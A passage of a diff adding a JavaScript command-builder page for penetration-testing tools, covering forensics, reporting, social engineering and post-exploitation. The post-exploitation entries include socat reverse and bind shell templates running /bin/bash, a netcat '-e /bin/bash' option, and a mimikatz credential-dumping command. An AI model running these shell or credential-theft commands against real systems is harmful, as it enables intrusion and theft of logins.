+          { type: "check", flag: "--ssl-insecure", label: "Disable SSL verification" },
+          { type: "check", flag: "-q", label: "Quiet mode" },
+        ]
+      },
+    ]
+  },
+  "Forensics": {
+    icon: "🔬", badge: "badge-forensics",
+    tools: [
+      { name: "autopsy", desc: "GUI digital forensics platform", badge: "badge-forensics",
+        opts: [
+          { type: "input", flag: "", label: "Case directory", placeholder: "/cases/mycase", key: "target" },
+        ]
+      },
+      { name: "binwalk", desc: "Firmware analysis & extraction", badge: "badge-forensics",
+        opts: [
+          { type: "input", flag: "", label: "Target file", placeholder: "firmware.bin", key: "target" },
+          { type: "check", flag: "-e", label: "Extract files" },
+          { type: "check", flag: "-M", label: "Scan extracted files (Matryoshka)" },
+          { type: "check", flag: "-A", label: "Scan for opcodes" },
+          { type: "check", flag: "-v", label: "Verbose output" },
+        ]
+      },
+      { name: "foremost", desc: "File carving / data recovery", badge: "badge-forensics",
+        opts: [
+          { type: "input", flag: "-i", label: "Input file/device", placeholder: "/dev/sdb" },
+          { type: "input", flag: "-o", label: "Output directory", placeholder: "/recovered" },
+          { type: "input", flag: "-t", label: "File types", placeholder: "jpg,doc,pdf" },
+          { type: "check", flag: "-v", label: "Verbose" },
+        ]
+      },
+      { name: "volatility", desc: "Memory forensics framework", badge: "badge-forensics",
+        opts: [
+          { type: "input", flag: "-f", label: "Memory image file", placeholder: "memory.dmp" },
+          { type: "input", flag: "--profile=", label: "Profile", placeholder: "Win7SP1x64" },
+          { type: "select", flag: "", label: "Plugin", key: "plugin", options: ["imageinfo","pslist","pstree","cmdline","filescan","netscan","malfind","dumpfiles","hivelist","hashdump"] },
+          { type: "input", flag: "-D", label: "Output directory", placeholder: "output/" },
+        ]
+      },
+      { name: "dd", desc: "Disk imaging / data copy utility", badge: "badge-forensics",
+        opts: [
+          { type: "input", flag: "if=", label: "Input file/device", placeholder: "/dev/sdb", key: "inf" },
+          { type: "input", flag: "of=", label: "Output file", placeholder: "disk.img", key: "of" },
+          { type: "input", flag: "bs=", label: "Block size", placeholder: "4M" },
+          { type: "check", flag: "conv=noerror,sync", label: "Skip errors (for damaged disks)" },
+          { type: "input", flag: "status=", label: "Progress", placeholder: "progress" },
+        ]
+      },
+      { name: "steghide", desc: "Steganography hide/extract tool", badge: "badge-forensics",
+        opts: [
+          { type: "select", flag: "", label: "Action", key: "sub", options: ["embed","extract","info"] },
+          { type: "input", flag: "-cf", label: "Cover/stego file", placeholder: "image.jpg" },
+          { type: "input", flag: "-sf", label: "Secret file (embed)", placeholder: "secret.txt" },
+          { type: "input", flag: "-p", label: "Passphrase", placeholder: "password" },
+          { type: "check", flag: "-f", label: "Force overwrite" },
+        ]
+      },
+      { name: "exiftool", desc: "Read/write media file metadata", badge: "badge-forensics",
+        opts: [
+          { type: "input", flag: "", label: "Target file", placeholder: "photo.jpg", key: "target" },
+          { type: "check", flag: "-a", label: "Show duplicate tags" },
+          { type: "check", flag: "-all=", label: "Remove all metadata" },
+          { type: "check", flag: "-recurse", label: "Recursive" },
+          { type: "input", flag: "-csv", label: "Export CSV", placeholder: "metadata.csv" },
+        ]
+      },
+    ]
+  },
+  "Reporting": {
+    icon: "📝", badge: "badge-misc",
+    tools: [
+      { name: "dradis", desc: "Collaboration & reporting platform", badge: "badge-misc",
+        opts: [
+          { type: "input", flag: "", label: "Server URL", placeholder: "http://localhost:3000", key: "target" },
+        ]
+      },
+      { name: "faraday", desc: "Integrated pentest management", badge: "badge-misc",
+        opts: [
+          { type: "input", flag: "--workspace", label: "Workspace", placeholder: "myworkspace" },
+          { type: "check", flag: "--gui", label: "Open GUI" },
+        ]
+      },
+      { name: "pipal", desc: "Password analysis & statistics", badge: "badge-misc",
+        opts: [
+          { type: "input", flag: "", label: "Password file", placeholder: "cracked.txt", key: "target" },
+          { type: "input", flag: "--output", label: "Output file", placeholder: "stats.txt" },
+        ]
+      },
+    ]
+  },
+  "Social Engineering": {
+    icon: "🎭", badge: "badge-misc",
+    tools: [
+      { name: "setoolkit", desc: "Social Engineering Toolkit", badge: "badge-exploit",
+        opts: [
+          { type: "check", flag: "-i", label: "Interactive mode" },
+        ]
+      },
+      { name: "gophish", desc: "Phishing framework", badge: "badge-exploit",
+        opts: [
+          { type: "input", flag: "--config", label: "Config file", placeholder: "config.json" },
+        ]
+      },
+    ]
+  },
+  "Post Exploitation": {
+    icon: "🏴", badge: "badge-exploit",
+    tools: [
+      { name: "mimikatz", desc: "Credential extraction on Windows", badge: "badge-pass",
+        opts: [
+          { type: "input", flag: "", label: "Command", placeholder: "sekurlsa::logonpasswords", key: "target" },
+          { type: "check", flag: "privilege::debug", label: "Enable debug privilege" },
+        ]
+      },
+      { name: "empire", desc: "PowerShell post-exploitation agent", badge: "badge-exploit",
+        opts: [
+          { type: "check", flag: "--debug", label: "Debug mode" },
+        ]
+      },
+      { name: "proxychains", desc: "Route traffic through proxy chains", badge: "badge-misc",
+        opts: [
+          { type: "input", flag: "", label: "Command to proxify", placeholder: "nmap -sT 192.168.1.1", key: "target" },
+          { type: "input", flag: "-f", label: "Config file", placeholder: "/etc/proxychains.conf" },
+          { type: "check", flag: "-q", label: "Quiet mode" },
+        ]
+      },
+      { name: "netcat", desc: "Network swiss-army knife", badge: "badge-misc",
+        opts: [
+          { type: "input", flag: "", label: "Host", placeholder: "192.168.1.1", key: "target" },
+          { type: "input", flag: "", label: "Port", placeholder: "4444", key: "port" },
+          { type: "check", flag: "-l", label: "Listen mode" },
+          { type: "check", flag: "-v", label: "Verbose" },
+          { type: "check", flag: "-n", label: "Numeric-only (no DNS)" },
+          { type: "check", flag: "-e /bin/bash", label: "Spawn shell (bind)" },
+          { type: "check", flag: "-u", label: "UDP mode" },
+          { type: "input", flag: "-w", label: "Timeout (seconds)", placeholder: "5" },
+        ]
+      },
+      { name: "socat", desc: "Bidirectional data relay / reverse shell", badge: "badge-misc",
+        opts: [
+          { type: "select", flag: "", label: "Mode", key: "mode", options: ["TCP-LISTEN:{PORT},reuseaddr EXEC:/bin/bash","TCP:{HOST}:{PORT} EXEC:/bin/bash","TCP-LISTEN:{PORT},reuseaddr STDOUT","FILE:/dev/tty,rawer TCP:{HOST}:{PORT}"] },
+          { type: "input", flag: "", label: "Host", placeholder: "192.168.1.10", key: "target" },
+          { type: "input", flag: "", label: "Port", placeholder: "4444", key: "port" },
+        ]
+      },
+    ]
+  }
+};
+
+let selectedTool = null;
+let selectedCat = null;
+let cmdHistory = [];
+
+function init() {
+  const catList = document.getElementById('catList');
+  Object.entries(TOOLS).forEach(([cat, data]) => {
+    const btn = document.createElement('button');
+    btn.className = 'cat-btn';
+    btn.innerHTML = `<span class="icon">${data.icon}</span>${cat}`;
+    btn.onclick = () => selectCategory(cat, btn);
+    catList.appendChild(btn);
+  });
+  selectCategory(Object.keys(TOOLS)[0], catList.querySelector('.cat-btn'));
+}
+
+function selectCategory(cat, el) {
+  selectedCat = cat;
+  document.querySelectorAll('.cat-btn').forEach(b => b.classList.remove('active'));
+  el.classList.add('active');
+  renderTools(cat);
+  document.getElementById('searchBox').value = '';
+}
+
+function renderTools(cat, filter) {
+  const panel = document.getElementById('toolsPanel');
+  const tools = cat ? TOOLS[cat].tools : Object.values(TOOLS).flatMap(c => c.tools);
+  const filtered = filter ? tools.filter(t => t.name.includes(filter) || t.desc.toLowerCase().includes(filter)) : tools;
+  if (!filtered.length) { panel.innerHTML = '<div class="no-results">No tools found for that search.</div>'; return; }
+
+  const groupBy = cat ? null : (() => {
+    const map = {};
+    Object.entries(TOOLS).forEach(([c, d]) => d.tools.forEach(t => map[t.name] = c));
+    return map;
+  })();
+
+  if (cat && !filter) {
+    panel.innerHTML = `<div class="section-title">${TOOLS[cat].icon} ${cat}</div><div class="tool-grid" id="toolGrid"></div>`;
+    const grid = document.getElementById('toolGrid');
+    filtered.forEach(t => grid.appendChild(makeCard(t)));
+  } else {
+    panel.innerHTML = '';
+    const byCat = {};
+    filtered.forEach(t => {
+      const c = groupBy ? groupBy[t.name] : cat;
+      if (!byCat[c]) byCat[c] = [];
+      byCat[c].push(t);
+    });
+    Object.entries(byCat).forEach(([c, ts]) => {
+      const sec = document.createElement('div');
+      sec.innerHTML = `<div class="section-title">${TOOLS[c].icon} ${c}</div><div class="tool-grid"></div>`;
+      ts.forEach(t => sec.querySelector('.tool-grid').appendChild(makeCard(t)));
+      panel.appendChild(sec);
+    });
+  }
+}
+
+function makeCard(tool) {
+  const card = document.createElement('div');
+  card.className = 'tool-card' + (selectedTool && selectedTool.name === tool.name ? ' selected' : '');
+  card.innerHTML = `<div class="tool-name">${tool.name}</div><div class="tool-desc">${tool.desc}</div><span class="tool-badge ${tool.badge}">${tool.badge.replace('badge-','')}</span>`;
+  card.onclick = () => { selectTool(tool); document.querySelectorAll('.tool-card').forEach(c => c.classList.remove('selected')); card.classList.add('selected'); };
+  return card;
+}
+
+function selectTool(tool) {
+  selectedTool = tool;
+  const area = document.getElementById('optionsArea');
+  let html = `<div class="options-title">${tool.name} — options</div>`;
+  tool.opts.forEach((opt, i) => {
+    html += `<div class="opt-group">`;
+    if (opt.type === 'input') {
+      html += `<label class="opt-label">${opt.label}</label>
+        <input class="opt-input" id="opt_${i}" placeholder="${opt.placeholder || ''}" oninput="buildCmd()">`;
+    } else if (opt.type === 'check') {
+      html += `<div class="opt-check"><input type="checkbox" id="opt_${i}" onchange="buildCmd()"><label for="opt_${i}">${opt.label}</label><span class="flag">${opt.flag}</span></div>`;
+    } else if (opt.type === 'select') {
+      html += `<label class="opt-label">${opt.label}</label>
+        <select class="opt-select" id="opt_${i}" onchange="buildCmd()">
+        ${opt.options.map(o => `<option value="${o}">${o}</option>`).join('')}
+        </select>`;
+    }
+    html += '</div>';
+  });
+  area.innerHTML = html;
+  buildCmd();
+}
+
+function buildCmd() {
+  if (!selectedTool) return;
+  const tool = selectedTool;
+  let parts = [tool.name];
+
+  tool.opts.forEach((opt, i) => {
+    const el = document.getElementById(`opt_${i}`);
+    if (!el) return;
+    const val = el.type === 'checkbox' ? el.checked : el.value.trim();
+    if (!val) return;
+
+    if (opt.type === 'check') {
+      if (val) parts.push(opt.flag);
+    } else if (opt.type === 'input') {
+      if (opt.key === 'target') { parts.push(val); }
+      else if (opt.key === 'wordlist') { parts.push(val); }
+      else if (opt.key === 'service') { parts.push(val); }
+      else if (opt.key) { parts.push(val); }
+      else if (opt.flag) {
+        if (opt.flag.endsWith('=')) parts.push(`${opt.flag}${val}`);
+        else parts.push(opt.flag, val);
+      } else {
+        parts.push(val);
+      }
+    } else if (opt.type === 'select') {
+      const cleanVal = val.split(' ')[0];
+      if (!cleanVal) return;
+      if (opt.key === 'sub') { parts.splice(1, 0, cleanVal); }
+      else if (opt.key === 'service') { parts.push(val.split(' ')[0]); }
+      else if (opt.key === 'plugin') { parts.push(cleanVal); }
+      else if (opt.key === 'mode') {
+        const tv = val.replace('{HOST}', getVal('target')||'HOST').replace('{PORT}', getVal('port')||'PORT');
+        parts.push(tv);
+      } else if (opt.key === 'atk') { parts.push(val); }
+      else if (opt.key === 'qtype') { parts.push(val); }
+      else if (opt.flag) { parts.push(opt.flag, cleanVal.replace(/[()]/g,'')); }
+      else { parts.push(cleanVal); }
+    }
+  });
+
+  // Special assembly for some tools
+  if (tool.name === 'hydra') {
+    const target = getVal('target'); const service = getServiceVal();
+    if (target && service) parts.push(`${service}://${target}`);
+  }
+  if (tool.name === 'airmon-ng') {
+    const chan = getVal('chan');
+    if (chan) { const ti = parts.indexOf(getVal('target')); if (ti > -1) parts.splice(ti+1, 0, chan); }
+  }
+  if (tool.name === 'dig') {
+    const qt = getOptVal('qtype');
+    if (qt) { const ui = parts.indexOf(getVal('target')); if (ui > -1) parts.splice(ui+1, 0, qt); }
+  }
+  if (tool.name === 'dd') {
+    parts = ['dd'];
+    tool.opts.forEach((opt, i) => {
+      const el = document.getElementById(`opt_${i}`);
+      if (!el) return;
+      const val = el.type === 'checkbox' ? el.checked : el.value.trim();
+      if (!val) return;
+      if (opt.type === 'check') { if (val) parts.push(opt.flag); }
+      else if (opt.flag) { parts.push(`${opt.flag}${val}`); }
+    });
+  }
+  if (tool.name === 'crunch') {
+    const min = getVal('min'), max = getVal('max'), cs = getVal('charset');
+    parts = ['crunch'];
+    if (min) parts.push(min);
+    if (max) parts.push(max);
+    if (cs) parts.push(cs);
+    tool.opts.forEach((opt, i) => {
+      if (opt.key) return;
+      const el = document.getElementById(`opt_${i}`);
+      if (!el) return;
+      const val = el.value.trim();
+      if (val && opt.flag) parts.push(opt.flag, val);
+    });
+  }
+
+  const cmd = parts.filter(Boolean).join(' ');
+  document.getElementById('cmdBox').textContent = cmd;
+}
+
+function getVal(key) {
+  if (!selectedTool) return '';
+  const i = selectedTool.opts.findIndex(o => o.key === key);
+  if (i < 0) return '';
+  const el = document.getElementById(`opt_${i}`);
+  return el ? el.value.trim() : '';
+}
+
+function getOptVal(key) {
+  if (!selectedTool) return '';
+  const i = selectedTool.opts.findIndex(o => o.key === key);
+  if (i < 0) return '';
+  const el = document.getElementById(`opt_${i}`);
+  return el ? el.value.trim() : '';
+}
+
+function getServiceVal() {
+  if (!selectedTool) return '';
+  const i = selectedTool.opts.findIndex(o => o.key === 'service');
+  if (i < 0) {
+    const si = selectedTool.opts.findIndex(o => o.label && o.label.toLowerCase().includes('service'));
+    if (si >= 0) { const el = document.getElementById(`opt_${si}`); return el ? el.value.trim().split(' ')[0] : ''; }
+    return '';
+  }
+  const el = document.getElementById(`opt_${i}`);
+  return el ? el.value.trim().split(' ')[0] : '';
+}
+
+function filterTools() {
+  const q = document.getElementById('searchBox').value.trim().toLowerCase();
+  if (!q) { if (selectedCat) renderTools(selectedCat); else renderTools(null); return; }
+  renderTools(null, q);
+}
+
+function copyCmd() {
+  const cmd = document.getElementById('cmdBox').textContent;
+  if (!cmd || cmd === 'Select a tool to get started...') return;
+  navigator.clipboard.writeText(cmd).then(() => {
+    const s = document.getElementById('cmdStatus');
+    s.textContent = 'Copied!';
+    setTimeout(() => s.textContent = '', 1800);
+  });
+}
+
+function addToHistory() {
+  const cmd = document.getElementById('cmdBox').textContent;
+  if (!cmd || cmd === 'Select a tool to get started...') return;
+  if (cmdHistory.includes(cmd)) return;
+  cmdHistory.unshift(cmd);
+  if (cmdHistory.length > 10) cmdHistory.pop();
+  renderHistory();
+}
+
+function renderHistory() {
+  const sec = document.getElementById('historySection');
+  const list = document.getElementById('historyList');
+  if (!cmdHistory.length) { sec.style.display = 'none'; return; }
+  sec.style.display = 'block';
+  list.innerHTML = cmdHistory.map((c, i) =>
+    `<div class="history-tag" onclick="loadHistory(${i})" title="${c}">${c.split(' ')[0]} <small style="opacity:0.5">#${i+1}</small></div>`
+  ).join('');
+}
+
+function loadHistory(i) {
+  document.getElementById('cmdBox').textContent = cmdHistory[i];
+}
+
+function clearAll() {
+  if (selectedTool) {
+    selectedTool.opts.forEach((opt, i) => {
+      const el = document.getElementById(`opt_${i}`);
+      if (!el) return;
+      if (el.type === 'checkbox') el.checked = false;
+      else el.value = '';
+    });
+    buildCmd();
+  }
+  document.getElementById('searchBox').value = '';
+  if (selectedCat) renderTools(selectedCat);
+}
+
+function resetOptions() { clearAll(); }
+
+init();
+</script>
+</body>
+</html>
